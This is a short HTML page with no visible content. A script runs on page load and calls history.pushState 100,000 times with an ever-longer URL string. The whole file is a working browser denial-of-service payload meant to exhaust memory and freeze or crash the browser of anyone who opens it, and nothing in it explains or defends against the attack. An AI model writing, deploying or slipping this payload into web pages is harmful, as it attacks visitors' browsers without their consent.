<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript">
        function LoadPage() 
        {
            var total = "";
            for( var i = 0; i < 100000; i++ )
            {
                total = total + i.toString();
                history.pushState(0,0, total );
            }
        }
        window.onload = LoadPage;
        </script>
    </head>
    <body>
    </body>
</html>
